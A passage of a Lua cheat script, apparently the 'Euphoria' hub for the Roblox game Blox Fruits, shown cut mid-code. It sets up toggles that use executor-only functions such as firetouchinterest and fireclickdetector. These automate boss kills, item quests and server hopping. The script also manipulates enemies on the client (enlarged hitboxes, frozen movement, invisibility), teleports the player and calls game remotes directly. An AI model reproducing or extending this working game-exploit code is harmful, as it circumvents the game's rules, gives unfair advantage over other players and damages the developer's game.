                                            until getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior")
                                        end
                                        if ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                            break
                                        end
                                        wait(2)
                                    end
                                end
                            end
                        end)
                    end
                end
            end) 
            FarmDemonicWisp = Sea3MaterialsSection:NewToggle("Farm Demonic Wisp", function(state)
                getgenv().EuphoriaSettings["Farm Demonic Wisp"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Demonic Wisp"] then FarmDemonicWisp:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Demonic Wisp"] then _G.FarmDemonicWisp = true else _G.FarmDemonicWisp = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmDemonicWisp and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") then
                                target = getClosest({"Demonic Soul"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDemonicWisp or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Demonic Soul") then
                                target = getClosest({"Demonic Soul"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDemonicWisp or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                    if string.find(v.Name, "Demonic Soul") then
                                        if getDistance(v.CFrame) > 500 then
                                            repeat wait()
                                                useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                toPoint(v.CFrame * CFrame.new(0,50,0))
                                            until getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") 
                                        end
                                        if ReplicatedStorage:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") then
                                            break
                                        end
                                        wait(2)
                                    end
                                end
                            end
                        end)
                    end
                end
            end) 
            AutoKillSoulReaper = Sea3ItemsSection:NewToggle("Auto Kill Soul Reaper", function(state)
                getgenv().EuphoriaSettings["Auto Kill Soul Reaper"] = state
                WriteSettings()
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Kill Soul Reaper"] and (workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper")) then _G.AutoSoulReaper = true else _G.AutoSoulReaper = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSoulReaper and third_sea then
                            if workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                v = workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper")
                                if v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        if useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not _G.AutoSoulReaper or not v or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    end)
                end
            end)
            AutoSpawnSoulReaper = Sea3ItemsSection:NewToggle("Auto Spawn Soul Reaper", function(state)
                getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] then AutoSpawnSoulReaper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] and  isItemInEquip("Hallow Essence") then
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                            wait()
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
                        end
                    end)
                end
            end)
            Sea3ItemsSection:NewButton("Spawn Soul Reaper (hallow essence)", function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                wait()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
            end)
            Sea3ItemsSection:NewLabel(" ")
            AutoCanvander = Sea3ItemsSection:NewToggle("Auto Canvander", function(state)
                getgenv().EuphoriaSettings["Auto Canvander"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Canvander"] then AutoCanvander:UpdateToggle(nil, true) end
            AutoCanvanderHop = Sea3ItemsSection:NewToggle("Auto Canvander Hop", function(state)
                getgenv().EuphoriaSettings["Auto Canvander Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Canvander Hop"] then AutoCanvanderHop:UpdateToggle(nil, true) end
            Sea3ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Canvander"] and not isWeaponInInventory("Canvander") then _G.AutoCanvander = true else _G.AutoCanvander = false end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.AutoCanvander and third_sea then
                            if game.Workspace.Enemies:FindFirstChild("Beautiful Pirate") and game.Workspace.Enemies:FindFirstChild("Beautiful Pirate"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Beautiful Pirate").Humanoid.Health > 0 then
                                v = game.Workspace.Enemies:FindFirstChild("Beautiful Pirate")
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    else
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            RenMon = v.Name
                                            RenPos = v.HumanoidRootPart.CFrame
                                        until not _G.AutoCanvander or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif game.ReplicatedStorage:FindFirstChild("Beautiful Pirate") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate").Humanoid.Health > 0 then
                                v = game.ReplicatedStorage:FindFirstChild("Beautiful Pirate")
                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                wait(4)
                            else
                                if getgenv().EuphoriaSettings["Auto Canvander Hop"] then
                                    HopServer()
                                end
                            end
                        end
                    end)
                end
            end)


            


            Sea3ItemsSection:NewLabel(" ")
            Sea3ItemsSection:NewButton("Turn On All Haki Plates [rip_indra]", function()
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor ~= BrickColor.new("Lime green") then 
                            if v.BrickColor == BrickColor.new("Oyster") then 
                                for ci,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Snow White' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Snow White")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Hot pink") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Winter Sky' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Winter Sky")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Really red") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Pure Red' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Pure Red")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                        end
                    end 
                end
                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)

            Sea3ItemsSection:NewButton("Spawn rip_indra [ACTIVATE PLATES BEFORE]", function()
                
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                counter = 0
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor == BrickColor.new("Lime green") then 
                            counter = counter + 1
                        end
                    end 
                end
                if counter == 3 then
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection, 0) 
                    wait()
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection, 1) 
                end

                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)
            killIndra = Sea3ItemsSection:NewToggle("Kill Indra", function(value)
                getgenv().EuphoriaSettings["Kill Indra"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Kill Indra"] then killIndra:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Kill Indra"] then
                            _G.KillIndra = true
                        else
                            _G.KillIndra = false
                        end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillIndra then
                            if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            elseif ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                v = ReplicatedStorage:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            end
                        end
                    end)
                end
            end)

            

            function getTushitaProgress()
                progress = ReplicatedStorage.Remotes.CommF_:InvokeServer("TushitaProgress")
                if progress.KilledLongma then 
                    return 100
                end
                if progress.OpenedDoor then
                    return 50
                else
                    return 0
                end
            end
            Sea3ItemsSection:NewLabel(" ")
            yamaProgress = Sea3ItemsSection:NewLabel("")
            spawn(function()
                while wait(2) do
                    pcall(function()
                        count = ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress")
                        yamaProgress:UpdateLabel("⚔️ Yama Progress: " .. tostring(count))
                        wait(30)
                    end)
                end
            end)

            AutoYamaToggle = Sea3ItemsSection:NewToggle("Auto Yama", function(state)
                getgenv().EuphoriaSettings["Auto Yama"] = state
                WriteSettings()
                AutoYama = state
            end)
            AutoYamaHopToggle = Sea3ItemsSection:NewToggle("Auto Yama Hop [Must have]", function(state)
                getgenv().EuphoriaSettings["Auto Yama Hop"] = state
                WriteSettings()
                AutoYamaHop = state
            end)
            if getgenv().EuphoriaSettings["Auto Yama"] or AutoYama then AutoYamaToggle:UpdateToggle(nil, true) end
            if getgenv().EuphoriaSettings["Auto Yama Hop"] or AutoYamaHop then AutoYamaHopToggle:UpdateToggle(nil, true) end

            AutoTushita = false
            AutoTushitaToggle = Sea3ItemsSection:NewToggle("Auto Tushita", function(state)
                getgenv().EuphoriaSettings["Auto Tushita"] = state
                WriteSettings()
                
            end)
            if getgenv().EuphoriaSettings["Auto Tushita"] then AutoTushitaToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Tushita"] and not isWeaponInInventory("Tushita") then
                            AutoTushita = true
                        else
                            AutoTushita = false
                        end
                    end)
                end
            end)
            AutoCDKToggle = Sea3ItemsSection:NewToggle("Auto Cursed Dual Katana", function(value)
                getgenv().EuphoriaSettings["AutoCDK"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["AutoCDK"] then AutoCDKToggle:UpdateToggle(nil, true) end

            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoTushita and third_sea then
                            if not isWeaponInInventory("Tushita") then
                                progress = getTushitaProgress()
                                if progress ~= 100 then
                                    if progress == 50 then
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("Longma") then
                                            useNearestEntrance(CFrame.new(-10148.1641, 423.734192, -9543.64648, -0.93039453, -7.7153004e-09, -0.366559714, 1.02859437e-08, 1, -4.71554458e-08, 0.366559714, -4.76435815e-08, -0.93039453) * OffsetCFrame())
                                            toPoint(CFrame.new(-10148.1641, 423.734192, -9543.64648, -0.93039453, -7.7153004e-09, -0.366559714, 1.02859437e-08, 1, -4.71554458e-08, 0.366559714, -4.76435815e-08, -0.93039453))
                                        else
                                            v = game:GetService("Workspace").Enemies:FindFirstChild("Longma")
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not AutoTushita or v.Humanoid.Health <= 0 or not v.Parent
                                            end
                                        end
                                    elseif progress == 0 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") or ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                            if not isItemInEquip("Holy Torch") then
                                                if useNearestEntrance(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame) then 
                                                    StopTween()
                                                end
                                                toPoint(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                                            end
                                        end
                                        if isItemInEquip("Holy Torch") then
                                            StopTween()
                                            wait(3)
                                            repeat wait()
                                                repeat wait()
                                                    if useNearestEntrance(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame) then
                                                        StopTween()
                                                    end
                                                    toPoint(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame)
                                                until getDistance(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame) < 50
                                                -- if delta then
                                                --     for i,torch in pairs(game.Workspace.Map.Turtle.QuestTorches:GetChildren()) do
                                                --         if getDistance(torch.CFrame) > 10 and not torch.Particles.Main.Enabled then
                                                --             repeat wait()
                                                --                 toTarget(torch.CFrame)
                                                --             until getDistance(torch.CFrame) < 10 or not AutoTushita or getTushitaProgress() > 0
                                                --             wait(1)
                                                --         end
                                                --     end
                                                -- else
                                                    for i,torch in pairs(game.Workspace.Map.Turtle.QuestTorches:GetChildren()) do
                                                        if torch:FindFirstChild("TouchInterest") then
                                                            firetouchinterest(LP.Character.HumanoidRootPart, torch, 0)
                                                            wait()
                                                            firetouchinterest(LP.Character.HumanoidRootPart, torch, 1)
                                                        end
                                                    end
                                                -- end
                                            until getTushitaProgress() > 0 or not AutoTushita
                                        end
                                    end
                                end
                            end 
                        end
                    end) 
                end
            end)
            
            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoYama and third_sea and not isWeaponInInventory("Yama") then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress") < 30 then
                                if LP.PlayerGui.Main.Quest.Visible == true then
                                    if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") then
                                        EliteName = "Diablo"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") then
                                        EliteName = "Deandre"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
                                        EliteName = "Urban"
                                    end
                                    if not game:GetService("Workspace").Enemies:FindFirstChild(EliteName) then
                                        if game.ReplicatedStorage:FindFirstChild(EliteName) then
                                            v = game.ReplicatedStorage:FindFirstChild(EliteName)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        else
                                            if EliteName == "Urban" then
                                                toTarget(CFrame.new(-12327.908203125, 361.136962890625, -9618.01171875))
                                            elseif EliteName == "Deandre" then
                                                toTarget(CFrame.new(-13982.4052734375, 330.6456298828125, -9260.4814453125))
                                            elseif EliteName == "Diablo" then
                                                toTarget(CFrame.new(-11153.138671875, 736.5569458007812, -6851.171875))
                                            end
                                        end
                                    else
                                        v = game:GetService("Workspace").Enemies:FindFirstChild(EliteName)
                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                            repeat wait()
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                PosMon = v.HumanoidRootPart.CFrame
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                v.HumanoidRootPart.Transparency = 1
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            until not AutoYama or v.Humanoid.Health <= 0 or not v.Parent
                                        end
                                    end
                                else
                                    if AutoYamaHop and ReplicatedStorage.Remotes["CommF_"]:InvokeServer("EliteHunter") == "I don't have anything for you right now. Come back later." then
                                        HopServer()
                                    else
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter")
                                    end
                                end
                            else
                                repeat wait(.1)
                                    fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                                until not isWeaponInInventory("Yama") or not AutoYama
                            end
                        end
                    end)
                end
            end)
            function isDoughSpawned()
                if ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") or game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                    return true
                else return false end
            end
            Sea3ItemsSection:NewLabel("")
            leftToSpawnDough = Sea3ItemsSection:NewLabel("Mobs Left to Spawn: Enable Auto Spawn Dough/Cake Boss")
            farmDough = Sea3ItemsSection:NewToggle("Farm Mobs for Spawn", function(value)
                getgenv().EuphoriaSettings["Farm Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Dough"] then farmDough:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Dough"] and not isDoughSpawned() then
                            _G.FarmDough = true
                        else
                            _G.FarmDough = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        local npcList = {"Head Baker","Baking Staff","Cookie Crafter","Cake Guard"}
                        if _G.FarmDough and not isDoughSpawned() then
                            qqw = getClosest(npcList)
                            if qqw then
                                if qqw.Humanoid.Health > 0 then
                                    repeat wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        qqw.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        qqw.HumanoidRootPart.CanCollide = false
                                        qqw.Humanoid.WalkSpeed = 0
                                        qqw.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = qqw.HumanoidRootPart.CFrame
                                        EquipWeapon(_G.SelectWeapon)
                                        qqw.HumanoidRootPart.Transparency = 1
                                        if useNearestEntrance(qqw.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toTarget(qqw.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not qqw or qqw.Humanoid.Health <= 0 or not _G.FarmDough or isDoughSpawned() or LP.Character.Humanoid.Health <= 0
                                    PosMon = nil
                                end
                            else
                                for i,v in pairs(getSpawnPoints(npcList)) do
                                    print("to spawn point")
                                    if getClosest(npcList) then break end
                                    if getDistance(v * OffsetCFrame()) > 100 then
                                        repeat wait()
                                            if useNearestEntrance(v * OffsetCFrame()) then
                                                StopTween()
                                            end
                                            toTarget(v * OffsetCFrame())
                                        until getDistance(v * OffsetCFrame()) < 50 or getClosest(npcList) or not _G.FarmDough
                                    end
                                end 
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)

            autoSpawnDough = Sea3ItemsSection:NewToggle("Auto Spawn Dough/Cake Boss", function(value)
                getgenv().EuphoriaSettings["Auto Spawn Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Spawn Dough"] then autoSpawnDough:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        local MobsLeft
                        if getgenv().EuphoriaSettings["Auto Spawn Dough"] then
                            if not isDoughSpawned() then
                                local mbs = ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", false)
                                if mbs then
                                    if string.len(mbs) == 88 then
                                        MobsLeft = tonumber(string.sub(mbs,39,41))
                                    elseif string.len(mbs) == 87 then
                                        MobsLeft = tonumber(string.sub(mbs,39,40))
                                    elseif string.len(mbs) == 86 then
                                        MobsLeft = tonumber(string.sub(mbs,39,39))
                                    end
                                else
                                    MobsLeft = 0
                                end
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..tostring(MobsLeft).." (Spawn Enabled)")
                            else
                                MobsLeft = 0
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: 0 (Spawn Enabled)")
                            end
                            if MobsLeft < 15 and _G.AutoBuySweetChalice then
                                local args = {
                                    [1] = "SweetChaliceNpc"
                                }
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                            end
                        else
                            if not isDoughSpawned() then
                                local mbs = ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
                                if mbs then
                                    if string.len(mbs) == 88 then
                                        MobsLeft = tonumber(string.sub(mbs,39,41))
                                    elseif string.len(mbs) == 87 then
                                        MobsLeft = tonumber(string.sub(mbs,39,40))
                                    elseif string.len(mbs) == 86 then
                                        MobsLeft = tonumber(string.sub(mbs,39,39))
                                    end
                                else
                                    MobsLeft = 0
                                end
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..tostring(MobsLeft))
                            else
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: 0")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)

            killDough = Sea3ItemsSection:NewToggle("Kill Dough King / Cake Prince", function(value)
                getgenv().EuphoriaSettings["Kill Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Kill Dough"] then killDough:UpdateToggle(nil, true) end
            killOnlyDough = Sea3ItemsSection:NewToggle("Kill ONLY Dough King", function(value)
                getgenv().EuphoriaSettings["kill Only Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["kill Only Dough"] then killOnlyDough:UpdateToggle(nil, true) end

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Kill Dough"] then
                            if getgenv().EuphoriaSettings["kill Only Dough"] then
                                if ReplicatedStorage:FindFirstChild("Dough King") and ReplicatedStorage:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Dough King") and game.Workspace.Enemies:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                end
                            else
                                if ReplicatedStorage:FindFirstChild("Dough King") and ReplicatedStorage:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Dough King") and game.Workspace.Enemies:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif ReplicatedStorage:FindFirstChild("Cake Prince") and ReplicatedStorage:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Cake Prince") and game.Workspace.Enemies:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                else
                                    _G.KillDough = false
                                end
                            end
                        else _G.KillDough = false
                        end
                    end)
                end
            end)
            autoBuyChalice = Sea3ItemsSection:NewToggle("Auto Buy Sweet Chalice", function(value)
                getgenv().EuphoriaSettings["Auto Buy Sweet Chalice"] = value
                _G.AutoBuySweetChalice = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Buy Sweet Chalice"] then autoBuyChalice:UpdateToggle(nil, true) end
            Sea3ItemsSection:NewButton("Buy Sweet Chalice", function()
                local args = {
                    [1] = "SweetChaliceNpc"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
            
            function tpToDoughIfNeed()
